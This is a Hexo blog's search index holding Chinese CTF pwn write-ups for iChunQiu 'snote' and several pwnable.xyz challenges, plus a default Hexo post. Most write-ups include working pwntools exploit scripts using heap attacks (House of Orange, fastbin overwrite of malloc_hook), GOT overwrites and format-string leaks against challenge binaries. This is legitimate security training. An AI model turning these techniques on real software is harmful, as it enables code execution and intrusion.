<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>iChunQiu 巅峰极客2019 pwn snote Writeup</title>
      <link href="/2019/10/19/iChunQiu-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22019-pwn-snote-Writeup/"/>
      <url>/2019/10/19/iChunQiu-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22019-pwn-snote-Writeup/</url>
      
        <content type="html"><![CDATA[<p>今天打了i春秋巅峰极客2019初赛，记录一下pwn题snote的解题过程</p><a id="more"></a><h1 id="题目限制"><a href="#题目限制" class="headerlink" title="题目限制"></a>题目限制</h1><p>这道题的show和delete都只能使用一次，且edit最多修改size + 8的内容，malloc max size =0x1000，这些限制相当大。</p><h2 id="解题思路-amp-运用到的方法"><a href="#解题思路-amp-运用到的方法" class="headerlink" title="解题思路 &amp; 运用到的方法"></a>解题思路 &amp; 运用到的方法</h2><ol><li>House of Orange</li><li>UAF</li><li>Unsorted Bin Attack</li><li>Fast Bin Attack<br>主要步骤就是</li></ol><ul><li>先申请一个chunk且size为0x08结尾，这样修改size + 8时就可以修改next chunk的size</li><li>因此可以修改top chunk的size为一个小于0x1000的值(注意要对齐内存)<h3 id="对齐内存"><a href="#对齐内存" class="headerlink" title="对齐内存"></a>对齐内存</h3><blockquote><p>什么是对齐到内存页呢？我们知道现代操作系统都是以内存页为单位进行内存管理的，一般内存页的大小是 4kb。那么我们伪造的 size 就必须要对齐到这个尺寸。在覆盖之前 top chunk 的 size 大小是 20fe1，通过计算得知 0x602020+0x20fe0=0x623000 是对于 0x1000（4kb）对齐的。</p></blockquote></li></ul><blockquote><pre><code>0x602000:   0x0000000000000000  0x00000000000000210x602010:   0x0000000000000000  0x00000000000000000x602020:   0x0000000000000000  0x0000000000020fe1 &lt;== top chunk0x602030:   0x0000000000000000  0x0000000000000000</code></pre><p>因此我们伪造的 fake_size 可以是 0x0fe1、0x1fe1、0x2fe1、0x3fe1 等对 4kb 对齐的 size。而 0x40 不满足对齐，因此不能实现利用。(引用自CTF-WIKI)</p><ul><li>在修改之后，当我们申请一个size = 4096(题目限制) 的chunk时，就会触发下列机制</li></ul></blockquote><blockquote><p>当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins</p></blockquote><blockquote><p>在 glibc/malloc/malloc.c 中的 _int_malloc 有这么一段代码，当将一个 unsorted bin 取出的时候，会将 bck-&gt;fd 的位置写入本 Unsorted Bin 的位置(就是main_arena + 某一固定offset)的地址</p><ul><li>在这道题中，就是当我们在修改top chunk size后申请size = 4096的chunk时，原top chunk就变成了unsorted bin，效果如下<br><img src="https://i.loli.net/2019/10/19/a82GTlwIosVdNPg.png" alt="markdown"></li><li>但是此时我们的ptr指向的是0x1000的chunk而非那个被放入unsorted bin的原top chunk，因此下一步便是再申请一个chunk 这样就会从那个unsorted bin 中切割出来chunk 依旧可以获得一个偏移固定的main_arena地址，效果如下，bk指针偏移量固定，main_arena + 1640<br><img src="https://i.loli.net/2019/10/19/dwbAm9cphxYESUK.png" alt="markdown"></li><li>在这之后，我们可以使用show()来获取main_arena的地址，进而获取libc的基址</li></ul></blockquote><h4 id="获取libc基地址"><a href="#获取libc基地址" class="headerlink" title="获取libc基地址"></a>获取libc基地址</h4><ul><li>就是bk中地址 - 1640 - libc基地址 = 固定偏移量</li><li>即0x7f554a5a7188 - 1640 - 0x7f554a1e2000 = 0x3C4B20<br><img src="https://i.loli.net/2019/10/19/JqeTnbKR1fSLBHi.png" alt="markdown"></li><li>综上，show()函数接受到的地址，再-1640 -0x3C4B20 就是基地址了<h4 id="获取malloc-hook"><a href="#获取malloc-hook" class="headerlink" title="获取malloc_hook"></a>获取malloc_hook</h4></li><li>malloc_hook的位置就在main_arena地址上方0x10，即偏移量0x3C4B10<h4 id="获得libc基址之后"><a href="#获得libc基址之后" class="headerlink" title="获得libc基址之后"></a>获得libc基址之后</h4></li><li>因为在delete()之后指针并未置0，因此可以通过UAF + fast_bin_attack来修改malloc_hook为one_gadget的地址</li><li>具体操作是先delete()，然后UAF,修改fd为fake_chunk_addr,再连续malloc两次，获得的就是那个fd的指针<h4 id="fake-chunk获取"><a href="#fake-chunk获取" class="headerlink" title="fake_chunk获取"></a>fake_chunk获取</h4><blockquote><p>find_fake_fast (malloc_hook_addr) (size)<br><img src="https://i.loli.net/2019/10/19/werltWpHa2zKud9.png" alt="markdown"></p></blockquote></li></ul><p>即偏移为离malloc_hook为0x23<br>要修改的fd就是fake_chunk的地址</p><h5 id="注"><a href="#注" class="headerlink" title="注"></a>注</h5><p>当后面两次malloc()获得fake_chunk后，edit的时候偏移是<em>0x23 - 0x10 = 0x13</em> (因为malloc时给的还要加上0x10的prev_size和size)</p><p>最后修改成功后再次malloc即可获得shell</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">#encoding:utf-8from pwn import *from LibcSearcher import LibcSearchersh = process(&#39;./snote&#39;)#sh = remote(&#39;55fca716.gamectf.com&#39;,37009)main_arena_offset = 1640offset_base = 0x3c4b20malloc_hook_offset = 0x3C4B10context.log_level = &#39;DEBUG&#39;def add(size,content):    sh.sendline(&#39;1&#39;)    sleep(0.5)    sh.sendlineafter(&#39;Size &gt; &#39;,str(size))    sh.sendlineafter(&#39;Content &gt; &#39;,content)    sh.recvuntil(&#39;Your choice &gt; &#39;)def delete():    sh.sendline(&#39;3&#39;)    sh.recvuntil(&#39;Your choice &gt;&#39;)def show():    sh.sendline(&#39;2&#39;)    ans = u64(sh.recvuntil(&#39;Done!&#39;)[8:16])    print(&#39;addr =&#39;,ans)    sh.recvuntil(&#39;Your choice &gt;&#39;)    return ansdef edit(size,content):    sh.sendline(&#39;4&#39;)    sleep(0.5)    sh.sendlineafter(&#39;Size &gt;&#39;,str(size))    sh.sendafter(&#39;Content &gt;&#39;,content)    sh.recvuntil(&#39;Your choice &gt;&#39;)sh.sendline(&#39;aaa&#39;)</code></pre><pre><code class="python">sh.recvuntil(&#39;Your choice &gt; &#39;)add(0x58,&#39;111&#39;) #0gdb.attach(sh)payload = &#39;\x00&#39; * 0x58  +p64(0xfa1)#0xfa1 内存页对齐edit(0x60,payload)add(4096,&#39;&#39;)add(0x60,&#39;&#39;)addr = show()main_arena_addr = addr - main_arena_offsetlibc_base = main_arena_addr - offset_baseone_gedget = libc_base + 0xf02a4malloc_hook = libc_base + malloc_hook_offsetfake_chunk_addr = malloc_hook - 0x23#find_fake_fast 时注意size是0x70 因为chunk头占0x10print(&#39;libc_base = &#39; ,hex(libc_base))print(&#39;main_arena =&#39; ,hex(main_arena_addr))print(&#39;malloc_hook=&#39;, hex(malloc_hook))print(&#39;one_gadget =&#39;,hex(one_gedget))print(&#39;fakechunk = &#39;,hex(fake_chunk_addr))delete()edit(8,p64(fake_chunk_addr))add(0x60,&#39;&#39;)add(0x60,&#39;&#39;)edit(27,&#39;\x00&#39; * 0x13 + p64(one_gedget))sh.sendline(&#39;1&#39;)sleep(0.2)sh.send(&#39;24&#39;)sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.xyz two targets WriteUp</title>
      <link href="/2019/09/12/twotargets/"/>
      <url>/2019/09/12/twotargets/</url>
      
        <content type="html"><![CDATA[<p>pwnable.xyz 上的two targets的WriteUp。</p><a id="more"></a><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://i.loli.net/2019/09/12/yN2GnJkgAhOiSVU.png" alt="MarkDown"></p><p>顾名思义，two targets，本题有两种做法。</p><h2 id="方法一-GOT覆写"><a href="#方法一-GOT覆写" class="headerlink" title="方法一 : GOT覆写"></a>方法一 : GOT覆写</h2><p><img src="https://i.loli.net/2019/09/12/3oWZYFRrVfyHunv.png" alt="MarkDown"></p><p><img src="https://i.loli.net/2019/09/12/MAsQIB13NypSlze.png" alt="MarkDown"></p><p>由于v7 v8之间距离为0x10 = 16 ，而scanf往<code>&amp;v7</code>中读入的有24字节，因此可以先选择输入2，覆写</p><p><code>v8</code>中存储的地址，然后输入3，达到任意写的目的。又因为并没有开启FULL RELRO保护，所以可以GOT覆写。</p><p><img src="https://i.loli.net/2019/09/12/Dqhrd3jSLR4lgvb.png" alt="MarkDown"></p><p><em>注意</em> </p><p>因为往v8中读入的scanf()是%d 因此win()函数的地址需要转化成10进制输入0x40099c = 4196764</p><h3 id="方法一-EXP"><a href="#方法一-EXP" class="headerlink" title="方法一 EXP"></a>方法一 EXP</h3><pre><code class="python">#coding:utf-8from pwn import *context.log_level = &#39;DEBUG&#39;#sh = process(&#39;./challenge&#39;)sh = remote(&#39;svc.pwnable.xyz&#39;,30031)elf = ELF(&#39;./challenge&#39;)#puts_got = elf.got[&#39;puts&#39;]#got覆写，如果选择覆写puts()则会报错，原因不明strcmp_got = elf.got[&#39;strncmp&#39;]#print(puts_got)flag =     0x40099Cpayload = &#39;A&#39; * 16 + p64(strcmp_got)#sh.recvuntil(&#39;&gt; &#39;)sh.sendlineafter(&#39;&gt; &#39;,&#39;2&#39;)#sh.recvuntil(&#39;: &#39;)#gdb.attach(sh)sh.sendafter(&#39;: &#39;,payload)print(payload)#sh.recvuntil(&#39;&gt; &#39;)sh.sendlineafter(&#39;&gt; &#39;,&#39;3&#39;)payload = &#39;4196764&#39;#sh.recvuntil(&#39;: &#39;)sh.sendlineafter(&#39;: &#39;,payload)#sh.recvuntil(&#39;&gt; &#39;)#gdb.attach(sh)sh.sendlineafter(&#39;&gt; &#39;,&#39;4&#39;)sh.interactive()</code></pre><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>方法二即按照题目思路，通过满足auth()函数的条件获得flag。</p><p><img src="https://i.loli.net/2019/09/12/l8hpWe6RCquALSj.png" alt="MarkDown"></p><p><code>s2</code>是全局变量 </p><p><img src="https://i.loli.net/2019/09/12/Cbcpi2Y1nhokurI.png" alt="MarkDown"></p><p>main() 即从<code>0x400B04</code> 到 <code>0x400B23</code>的内容</p><p><img src="https://i.loli.net/2019/09/12/mrv7etdOAulVYwk.png" alt="MarkDown"></p><p><em>注意</em></p><p>看auth()的运算式时一定要仔细，我就因为括号顺序看错直接整个式子就错了。是左边<code>a1[i]</code>经过运算之后再和<code>main[i]</code>异或得到<code>s2[i]</code>的值。</p><h3 id="方法二-EXP"><a href="#方法二-EXP" class="headerlink" title="方法二 EXP"></a>方法二 EXP</h3><pre><code class="python">#encoding:utf-8main = &#39;55 48 89 E5 48 83 EC 50 64 48 8B 04 25 28 00 00 00 48 89 45 F8 31 C0 E8 24 FE FF FF 48 8D 45 C0&#39;.split(&#39; &#39;)s2   = &#39;11 DE CF 10 DF 75 BB A5 43 1E 9D C2 E3 BF F5 D6 96 7F BE B0 BF B7 96 1D A8 BB 0A D9 BF C9 0D FF&#39;.split(&#39; &#39;)#print(main)#print(s2)result = []for i in range(32):    result.append( int(main[i],16) ^ int(s2[i],16) )ans = &#39;&#39;for i in range(32):    for j in range(256):        if(((j &gt;&gt; 4) | ( (16 * j) &amp; 0xff ) ) == result[i] ):            ans += chr(j)#特别注意： (16*j)需要 &amp; 0xff,因为16*j的结果很容易就&gt;256 之后结果一定不正确print(ans)from pwn import *context.log_level = &#39;DEBUG&#39;#sh = process(&#39;./challenge&#39;)sh = remote(&#39;svc.pwnable.xyz&#39;,30031)sh.sendlineafter(&#39;&gt; &#39;,&#39;1&#39;)sh.sendlineafter(&#39;: &#39;,ans)sh.sendlineafter(&#39;&gt; &#39;,&#39;4&#39;)sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.xyz Note WriteUp</title>
      <link href="/2019/09/12/note/"/>
      <url>/2019/09/12/note/</url>
      
        <content type="html"><![CDATA[<p>pwnable.xyz 上的Note的WriteUp。</p><a id="more"></a><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://i.loli.net/2019/09/12/DepwVgEmMrjNcnC.png" alt="MarkDown"></p><p><img src="https://i.loli.net/2019/09/12/C1gbnhT5GUlcfPj.png" alt="MarkDown"></p><p><img src="https://i.loli.net/2019/09/12/ykEMC2G7xQbXTpH.png" alt="MarkDown"></p><p><img src="https://i.loli.net/2019/09/12/dQTXpF9oxqCBIz2.png" alt="MarkDown"></p><p>目标是触发win()函数。注意到，输入1进入的<code>edit_note()</code>函数可对全局变量<code>s</code>进行任意长度写，其中buf和s的距离是0x20，而输入2进入的 <code>edit_desc()</code>函数是从标准输入流写入<code>buf</code>内容所指的地址中，由此可以通过先输入1，将buf中内容覆写，再输入2，达到任意地址写的目的。</p><p>还有一点，因为该程序并未开启RELRO保护，因此可以进行GOT表覆写.</p><p><img src="https://i.loli.net/2019/09/12/lHm18kxzP2QNUcO.png" alt="MarkDown"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *context.log_level = &#39;DEBUG&#39;flag = 0x40093celf = ELF(&#39;./challenge&#39;)puts_got = elf.got[&#39;puts&#39;]print(hex(puts_got))#puts_got = 0x601220sh = process(&#39;./challenge&#39;)#sh = remote(&#39;svc.pwnable.xyz&#39;,30016)sh.recvuntil(&#39;&gt; &#39;)payload = &#39;A&#39; * 32 + p64(puts_got)sh.sendline(&#39;1&#39;)sh.recvuntil(&#39;? &#39;)sh.sendline(&#39;52&#39;)sh.recvuntil(&#39;note: &#39;)sh.sendline(payload)sh.recvuntil(&#39;&gt; &#39;)sh.sendline(&#39;2&#39;)sh.recvuntil(&#39;desc: &#39;)sh.sendline(p64(flag))sh.recvuntil(&#39;&gt; &#39;)sh.sendline(&#39;123&#39;)sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.xyz misalignment WriteUp</title>
      <link href="/2019/09/12/misaligment/"/>
      <url>/2019/09/12/misaligment/</url>
      
        <content type="html"><![CDATA[<p>pwnable.xyz 上的misalignment的WriteUp。</p><a id="more"></a><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://i.loli.net/2019/09/12/N7duFq2lIhxyGz8.png" alt="MarkDown"></p><p>目标很明确，使v5+7 == 0xB000000B5即可获得flag。</p><p><em>注意</em></p><ol><li><p>v6/v7/v8 是int64，占8字节，因此通过每次输入v8只能控制 <code>v5 - v5+7</code>  ,<code>v5+8 - v5+15</code>这两个范围的内容中的一个，因此需要分两次输入。</p></li><li><p>因为是小端序，因此从v5 + 7一直到 v5 + 14 中的值应该按次序为0xB5,0x00,0x00,0x00,0x0B,0x00,0x00,0x00.</p></li></ol><p>由此可得，第一次v8 = -6时，v6+v7应该 = 0xB500000000000000 特别地，因为刚好8字节，符号位又为1，因此输入的值应该为<code>-5404319552844595200</code>（从计算器中可得）</p><p><img src="https://i.loli.net/2019/09/12/6mIfwGd7FOVAqYx.png" alt="MarkDown"></p><p>同理，第二次v8 = -5 ，输入的值就是0x0B000000 = 184549376</p><p>运行脚本即可得flag。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *context.log_level = &#39;DEBUG&#39;#sh = process(&#39;./challenge&#39;)sh = remote(&#39;svc.pwnable.xyz&#39;,30003)#sh.recv()#gdb.attach(sh)sh.sendline(&#39;-5404319552844595200 0 -6&#39;)sh.sendline(&#39;184549376 0 -5&#39;)sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.xyz GrownUp WriteUp</title>
      <link href="/2019/09/12/grownup/"/>
      <url>/2019/09/12/grownup/</url>
      
        <content type="html"><![CDATA[<p>pwnable.xyz 上的GrownUp的WriteUp。</p><a id="more"></a><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://i.loli.net/2019/09/12/wQjiYqFezdTZ35o.png" alt="Markdown"></p><p>一开始，先用shift+F12发现flag字符串，赶忙提交后发现不对</p><p><img src="https://i.loli.net/2019/09/12/5YvpDJyMcxkes3a.png" alt="Markdown"></p><p>实际上是提示了我们服务器端的flag地址是0x601080</p><p>开始正经做题，似乎难以下手，但是注意到<code>printf(qword_601160, usr)</code>这一行可能有格式化字符串漏洞。</p><p>在gdb中发现<code>qword_601160</code>的值为0x601168</p><p><img src="https://i.loli.net/2019/09/12/pOMIb1GfBEog3FQ.png" alt="Markdown"></p><p>而<code>qword_601160</code>和<code>usr</code>的距离是0x80 = 128</p><pre><code>read(0, src, 0x80uLL)strcpy(usr, src);</code></pre><p>这两行乍一看也没有问题</p><p><em>关键</em>  ：strcpy()函数会在复制结束后在目标字符串后添加结束符<code>/x00</code> ；read()则不会。</p><p>由此，如果我们恰好对src输入128个字符，这样最后一个被添加到末尾的<code>/x00</code>就会溢出到0x601160，并且由于小端序，会覆盖原来的<code>/x68</code>，这样qword_601160的值就会被改为0x601100，是usr+32的地址，我们就可以利用格式化字符串漏洞泄露栈中内容了。如果我们之前曾经把flag的地址输入栈中，那么我们就可以用<code>%s</code>将其输出.</p><pre><code class="python">from pwn import * context.log_level = &#39;DEBUG&#39;sh = process(&#39;./GrownUpRedist&#39;)flag = 0x601080payload = &#39;&#39;payload += &#39;y&#39; * 8 + p64(flag)sh.recvuntil(&#39;Are you 18 years or older? [y/N]: &#39;)sh.send(payload)payload = &#39;&#39;payload = &#39;A&#39; * 32 + &#39;%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p &#39;length = len(payload)payload += &#39;A&#39; * (128 - length)sh.recvuntil(&#39;Name: &#39;)sh.sendline(payload)print(sh.recvall())sh.interactive()</code></pre><p>在试运行时发现</p><p><img src="https://i.loli.net/2019/09/12/w6KPeLyriD2tmOV.png" alt="Markdown"></p><p>第九个泄露的地址为flag地址0x601080，因此将脚本中的对应位置修改为<code>%s</code>即可得flag。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">#encoding:utf-8from pwn import * context.log_level = &#39;DEBUG&#39;#sh = process(&#39;./GrownUpRedist&#39;)sh = remote(&#39;svc.pwnable.xyz&#39;,30004)flag = 0x601080payload = &#39;&#39;payload += &#39;y&#39; * 8 + p64(flag)sh.recvuntil(&#39;Are you 18 years or older? [y/N]: &#39;)sh.send(payload)#这里如果是sendline()就会报错 原因不明payload = &#39;&#39;payload = &#39;A&#39; * 32 + &#39;%p,%p,%p,%p,%p,%p,%p,%p,%s,%p,%p,%p,%p,%p,%p &#39;#第九个位置如果用%p可以见到0x601080 就是flag的地址了 之后改成%s输出flaglength = len(payload)payload += &#39;A&#39; * (128 - length)#payload.ljust(128,&#39;A&#39;)#print(payload)sh.recvuntil(&#39;Name: &#39;)sh.sendline(payload)print(sh.recvall())sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.xyz add WriteUP</title>
      <link href="/2019/08/08/add/"/>
      <url>/2019/08/08/add/</url>
      
        <content type="html"><![CDATA[<p>pwnable.xyz 上的add的WriteUP。</p><a id="more"></a><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="http://i2.tiimg.com/696456/0f3701a7745115c4.png" alt="Markdown"></p><p>依旧是拖进IDA</p><p><img src="http://i2.tiimg.com/696456/745835338a81ed4f.png" alt="Markdown"></p><p><img src="http://i2.tiimg.com/696456/6cef7378623e6976.png" alt="Markdown"></p><p>注意到<code>win()</code>函数可获得flag，地址为0x400822 == 4196386。而<code>v7[v6] = v4 + v5</code>这一步可以任意覆写栈上内容，只要利用这个修改位于<code>rbp + 8</code>的ret地址，然后在第二次while循环时输入任意非数字字符使得<code>scanf()</code>返回值 != 3，在return时就可cat /flag 。</p><h2 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h2><p> v7 = rbp - 60h ; ret地址 = rbp + 8h ; 因此距离为0x68 = 104。值得注意的是v7数组类型是 <em>int64</em> ，占8个字节，所以 v6应该等于 104 / 8 == 13。  </p><p>另一边，v4 + v5 = win()函数的入口地址 = 4196386d即可。</p><h3 id="最终输入"><a href="#最终输入" class="headerlink" title="最终输入"></a>最终输入</h3><p>依旧不用写EXP</p><p>第一次循环 v4 = 4196385 v5 = 1 v6 =13</p><p>第二次循环，随便打个字母就行。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.xyz sub WriteUp</title>
      <link href="/2019/08/08/sub/"/>
      <url>/2019/08/08/sub/</url>
      
        <content type="html"><![CDATA[<p> pwnable.xyz上的白给题的wp。</p><a id="more"></a><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="http://i2.tiimg.com/696456/4df890822636f8f2.png" alt="Markdown">  </p><p>直接拖进IDA:</p><p><img src="http://i2.tiimg.com/696456/ae51a0863b07f649.png" alt="Markdown"></p><p>只要满足v4 - v5 == 4919即可。所以v4=4918，v5=-1就行了，连EXP都不用写。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.xyz welcome WriteUp</title>
      <link href="/2019/08/07/pwnable-xyz-welcome-WriteUp/"/>
      <url>/2019/08/07/pwnable-xyz-welcome-WriteUp/</url>
      
        <content type="html"><![CDATA[<p>开始做pwnable.xyz上的题目了，记录下做题的思路。</p><a id="more"></a><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="http://i1.fuimg.com/696456/119eebdc5119a96f.png" alt="Markdown"></p><p>​        </p><p>​    下载后解压，试运行：</p><p><img src="http://i1.fuimg.com/696456/12e8d4e4025934aa.png" alt="Markdown"></p><p>​    拖进IDA中查看源码:  </p><p><img src="http://i1.fuimg.com/696456/186e0c53b922e2b4.png" alt="Markdown"></p><p>发现Leak给出的是v3的地址，而题目的目的是要将<code>*v3</code>的值改为<code>0</code>，这将会是一个突破口。在一开始我以为<code>malloc()</code>函数申请的两个空间是连续的，但在gdb中运行后发现并不如此。  </p><p><strong>关键点</strong></p><ol><li><p><code>malloc()</code>函数在申请空间失败时返回<code>NULL</code> ,且NULL == 0.</p></li><li><p><code>v5[size - 1]</code> == <code>*(v5 + (size-1) * sizeof(char) )</code>  </p></li></ol><p>因此当我们使得<code>malloc()</code>函数分配空间失败时，v5 == 0 ，就可以实现对<code>hex(size-1)</code>地址的赋值为0操作，即可获得flag。  </p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code>from pwn import *sh = remote(&quot;svc.pwnable.xyz&quot;,30000)sh.recvuntil(&quot;Leak:&quot;)leak = sh.recvline()#print(leak)payload = str(int(leak,16) + 1)#print(payload)sh.recvuntil(&quot;Length of your message: &quot;)sh.sendline(payload)sh.recv()sh.sendline(&quot; &quot;)print(sh.recv())</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2019/08/03/hello-world/"/>
      <url>/2019/08/03/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><a id="more"></a><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
